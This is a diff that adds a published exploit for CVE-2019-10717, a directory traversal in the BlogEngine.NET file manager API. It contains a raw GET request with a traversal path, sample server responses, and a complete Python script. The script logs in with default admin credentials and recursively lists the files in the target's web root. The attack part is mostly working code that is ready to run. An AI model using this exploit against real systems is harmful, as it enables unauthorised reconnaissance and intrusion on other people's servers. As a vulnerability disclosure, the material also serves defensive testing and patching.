@@ -1,0 +1,183 @@
+# Exploit Title: Directory Traversal on BlogEngine.NET
+# Date: 24 Jun 2019
+# Exploit Author: Aaron Bishop
+# Vendor Homepage: https://blogengine.io/
+# Version: v3.3.7
+# Tested on: 3.3.7, 3.3.6
+# CVE : 2019-10717
+
+1. Description
+==============
+
+BlogEngine.NET is vulnerable to a directory traversal.  The page parameter, passed to /api/filemanager, reveals the contents of the directory.
+
+2. Proof of Concept
+=============
+
+Log in to the application and submit a GET request to /api/filemanager:
+
+Request:
+
+~~~
+GET /api/filemanager?path=/../../ HTTP/1.1
+Host: $RHOST
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: $COOKIE
+Connection: close
+Upgrade-Insecure-Requests: 1
+~~~
+
+Depending on how the request is submitted, the response may be XML or JSON
+
+XML Response
+
+~~~
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/xml; charset=utf-8
+Expires: -1
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Date: Wed, 15 May 2019 01:58:46 GMT
+Connection: close
+Content-Length: 13030
+
+<ArrayOfFileInstance xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/BlogEngine.Core.FileSystem">
+<FileInstance>
+    <Created>5/14/2019 6:58:46 PM</Created>
+    <FileSize></FileSize>
+    <FileType>Directory</FileType>
+    <FullPath>~/App_Data/files/../..</FullPath>
+    <IsChecked>false</IsChecked>
+    <Name>...</Name>
+    <SortOrder>0</SortOrder>
+</FileInstance>
+...
+~~~
+
+JSON Response
+
+~~~
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/json; charset=utf-8
+Expires: -1
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Date: Wed, 15 May 2019 02:35:13 GMT
+Connection: close
+Content-Length: 10011
+
+[
+    {
+        "IsChecked":false,
+        "SortOrder":0,
+        "Created":"5/14/2019 7:35:13 PM",
+        "Name":"...",
+        "FileSize":"",
+        "FileType":0,
+        "FullPath":"~/App_Data/files/../..",
+        "ImgPlaceholder":""
+    }
+...
+~~~
+
+import argparse
+import json
+import os
+import re
+import requests
+import sys
+
+"""
+Exploit for CVE-2019-10717
+
+CVE Identified by: Aaron Bishop
+Exploit written by: Aaron Bishop
+
+Outputs list of filenames found in web root
+
+python exploit.py -t $RHOST
+
+?path=/../..
+/../../archive.aspx
+/../../archive.aspx.cs
+/../../archive.aspx.designer.cs
+/../../BlogEngine.NET.csproj
+/../../BlogEngine.NET.csproj.user
+/../../contact.aspx
+/../../contact.aspx.cs
+/../../contact.aspx.designer.cs
+"""
+
+urls = {
+        "login": "/Account/login.aspx",
+        "traversal": "/api/filemanager"
+       }
+
+def make_request(session, method, target, data={}):
+    proxies = {
+            "http": "127.0.0.1:8080",
+            "https": "127.0.0.1:8080"
+              }
+    if method == 'GET':
+        r = requests.Request(method, target, params=data)
+    elif method == 'POST':
+        r = requests.Request(method, target, data=data)
+    prep = session.prepare_request(r)
+    resp = session.send(prep, verify=False, proxies=proxies)
+    return resp.text
+
+def login(session, host, user, passwd):
+    resp = make_request(session, 'GET', host+urls.get('login'))
+    login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp)
+    login_data = dict([(i[0],i[2]) for i in login_form])
+    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})
+    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})
+    resp = make_request(session, 'POST', host+urls.get('login'), login_data)
+
+def parse(body, path, outfile):
+    paths = json.loads(body)
+    new_paths = set()
+    for i in paths:
+        if i.get('FileType') == 0:
+            new_paths.add(i.get('FullPath'))
+        else:
+            outfile.write("{path}\n".format(path=i.get('FullPath')))
+    return new_paths
+
+def traverse(session, host, paths, outfile, visited=set()):
+    paths = set(paths) - visited
+    for path in paths:
+        print path
+        outfile.write("\n?path={path}\n".format(path=path))
+        visited.add(path)
+        resp = make_request(session, 'GET', host+urls.get('traversal'), data=dict(path=path))
+        new_paths = parse(resp, path, outfile)
+        if new_paths:
+            traverse(session, host, new_paths, outfile, visited)
+
+def main(host, user, passwd, root, outfile):
+    with requests.Session() as s:
+        login(s, host, user, passwd)
+        traverse(s, host, root, outfile)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10717 Path traversal')
+    parser.add_argument('-t', '--target', action="store", dest="target", required=True, help='Target host')
+    parser.add_argument('-u', '--user', default="admin", action="store", dest="user", help='Account on blog')
+    parser.add_argument('-p', '--passwd', default="admin", action="store", dest="passwd", help='Password for account')
+    parser.add_argument('-r', '--root', nargs='+', default="/../..", help='Starting paths')
+    parser.add_argument('-s', '--ssl', action="store_true", help="Force SSL")
+    parser.add_argument('-o', '--outfile', type=argparse.FileType('w'), default='CVE-2019-10717.txt')
+    args = parser.parse_args()
+
+    protocol = "https://" if args.ssl else "http://"
+    if isinstance(args.root, str):
+        args.root = [args.root]
+    main(protocol + args.target, args.user, args.passwd, args.root, args.outfile)
